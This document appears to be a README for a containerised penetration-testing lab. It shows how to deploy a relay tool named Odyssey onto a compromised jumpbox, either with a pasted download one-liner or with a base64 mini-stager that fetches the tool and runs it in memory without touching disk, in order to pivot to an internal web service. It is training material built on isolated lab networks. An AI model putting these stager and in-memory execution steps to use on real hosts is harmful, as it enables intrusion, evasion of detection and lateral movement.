# Lab: Stager (deploy Odyssey via one-liner or base64)

Demonstrates two stager workflows: a one-liner (no auth, raw download) and a base64 mini-stager (token auth, in-memory execution). Both deploy Odyssey on a compromised jumpbox to pivot to an internal service.

## Network layout

```
pentester (10.10.10.3)       jumpbox (10.10.10.2 / 10.10.20.3)       destiny (10.10.20.2)
        |                              |                                     |
        +--- pentest-net 10.10.10.0/24 +--- internal-net 10.10.20.0/24 -----+
```

- **pentester** has Odyssey installed, runs `stager-server`
- **jumpbox** has only bash and base64, receives Odyssey via paste
- **destiny** runs httpd with `FLAG{odyssey_stager_works}`

## Usage

```bash
docker compose up -d --build
```

### Method A: one-liner (no auth)

Open three terminals:

```bash
# Terminal 1 (pentester - server)
docker exec -it pentester-stg bash
odyssey stager-server --listen 0.0.0.0:4444 --binary /usr/local/bin/odyssey --no-auth --single-use --verbose

# Terminal 2 (pentester - generate one-liner)
docker exec -it pentester-stg bash
odyssey stager --connect 10.10.10.3:4444 --os linux --format oneliner --run-args "relay --listen 0.0.0.0:8080 --to 10.10.20.2:80 --verbose"

# Terminal 3 (jumpbox - paste one-liner)
docker exec -it jumpbox-stg bash
# paste the one-liner from Terminal 2

# Terminal 2 (pentester - verify)
curl http://10.10.10.2:8080
```

Expected: `FLAG{odyssey_stager_works}`

### Method B: base64 mini-stager (token auth, memfd)

A pre-compiled mini-stager (~18 KB) authenticates with a token, downloads Odyssey, and executes it in memory via `memfd_create` (Linux >= 3.17). The generator outputs ~13 lines of base64 that fit in terminal paste buffers.

```bash
# Terminal 1 (pentester - server with token)
docker exec -it pentester-stg bash
odyssey stager-server --listen 0.0.0.0:5555 --binary /usr/local/bin/odyssey \
  --token "lab-stager-token-2026!" \
  --args "relay --listen 0.0.0.0:9090 --to 10.10.20.2:80 --verbose" \
  --single-use --verbose

# Terminal 2 (pentester - generate base64 mini-stager)
docker exec -it pentester-stg bash
odyssey stager --connect 10.10.10.3:5555 --os linux --format base64 --token "lab-stager-token-2026!"
# copy the output (~13 lines)

# Terminal 3 (jumpbox - paste all lines)
docker exec -it jumpbox-stg bash
# paste the lines; the mini-stager connects, authenticates, downloads and runs Odyssey

# Terminal 2 (pentester - verify)
curl http://10.10.10.2:9090
```

Expected: `FLAG{odyssey_stager_works}`

The `--args` on the server tell the mini-stager what arguments to pass to Odyssey after download. On kernels >= 3.17, the binary never touches disk.

## Cleanup

```bash
docker compose down
```
